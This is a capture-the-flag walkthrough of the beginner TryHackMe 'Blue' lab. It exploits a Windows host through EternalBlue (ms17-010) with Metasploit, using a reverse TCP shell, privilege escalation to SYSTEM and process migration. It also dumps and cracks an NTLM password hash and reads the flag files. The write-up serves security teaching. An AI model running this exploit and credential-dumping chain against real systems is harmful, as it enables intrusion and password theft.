---
description: 'This is my walkthrough for the TryHackMe Room: Blue.'
---

# Blue

The room can be found [here](https://tryhackme.com/room/blue). This is a pretty straight forward room, the hints and video will pretty much help anyone through it as that's what this room is meant for, to help beginners learn.

## Task 1

### Question #1: Scan the machine

We'll scan the machine with Nmap first: sudo nmap -sS -sV -vv --script vuln -oA Blue 10.10.18.94

### Question #2: How many ports are open with a port number under 1000?

Looking through our scan results we can see:\


![Nmap Scan](<../.gitbook/assets/image (130).png>)

We can find our answer pretty easily.

### Question #3: What is this machine vulnerable to?

Our argument of --script vuln scanned the target for any known vulnerabilities, which returned:

![](<../.gitbook/assets/image (16).png>)

showing the target is vulnerable to: ms17-010

## Task 2

### Question #2: Find the exploitation code we will run against the machine. What is the full path of the code?

With Metasploit up and loaded we search for ms17-010. `search ms17-010`

![](<../.gitbook/assets/image (61).png>)

We can see a couple different modules but as this room is called "Blue" we can guess we're after the Eternal Blue module "exploit/windows/smb/ms17\_010\_eternalblue". Knowing that is the module we want we can type out "use exploit/windows/smb/ms17\_010\_eternalblue" OR use # as in the number next to the module. For me it's 0.

Usually when selecting a module it's good to run `show options` to see what options are required to be set for this module to run. In this case, the only option that is not already set for us is the RHOST option, or our target. We set that with `set rhosts 10.10.18.94` and can verify by running `show options` again.

The room does specify one more thing before we exploit the target, it would like us to change the payload to "windows/x64/shell/reverse\_tcp" by running `set payload windows/x64/shell/reverse_tcp`.

With this payload option set, we can type `run` or `exploit` to get our shell on our target.

![](<../.gitbook/assets/image (10) (2).png>)

## Task 3

Background our newly obtained shell with CTRL+Z.

### Question #1: Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use?

There's a few ways to obtain the answer to this question but rather than use google, we can do what we did before and search within metasploit. `search shell_to_meterpreter`

this should return `post/multi/manage/shell_to_meterpreter`. So let select this module with `use 0`

### Question 2: Show options, what option are we required to change?

As mentioned before, when selecting a module to use, it's usually good to run `show options` to see what options are required to be set to run this module. Running this will show you we need to set the SESSION with `set SESSION 1`.

Once that completes, reconnect back to the backgrounded session with `sessions -i 2` and verify we are the SYSTEM by running `getsystem`, we can also type `shell` and run `whoami`.

![](<../.gitbook/assets/image (154).png>)

Now we want migrate to a different process that is running as SYSTEM, so lets background that shell again with `CTRL+Z(Only do this IF we are in the shell and not in the meterpreter session.)`, and let's see whats other processes are running on this system by typing `ps`. Once we find a process that is already being run from the `NT AUTHORITY\SYSTEM` user, we want to take note of the PID, for example, conhost.exe, for me that PID is 2480. We can run `migrate 2480` to then migrate over to that process.

This may or may not work for you so try different processes to migrate to.

## Task 4

### Question #1: What is the name of the non-default user?

From our meterpreter session, we can run hashdump to show us all the users and hashed passwords of the users on the system.

![](<../.gitbook/assets/image (67).png>)

### Question #2: Copy this password hash to a file and research how to crack it. What is the cracked password?

Once we copy Jons NTLM hash `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`. We can crack it for this we will use JohnTheRipper. I am running this from a personally setup VM so I have John installed into the /opt/ directory and will be using the classic rockyou.txt that I have stored inside SecLists password directory.

I have copied Jons hash to a file called jonhash in my current directory. So poninting JohnTheTipper at the hash and specifying the hash format and selecting the wordlist we want to use, we can attempt to crack the hash. `sudo /opt/john/run/john jon --format=NT --wordlist=/opt/SecLists/Passwords/rockyou.txt`

![](<../.gitbook/assets/image (6) (3).png>)

## Task 5

I ran `search -f flag*.txt` from the meterpreter session and was able to locate the path to flags1 2 and 3. So you can then cat the file paths to obtains the flags as well:

cat c:\\\flag1.txt

cat c:\\\Windows\\\System32\\\config\\\flag2.txt

cat c:\\\Users\\\Jon\\\Documents\\\flag3.txt
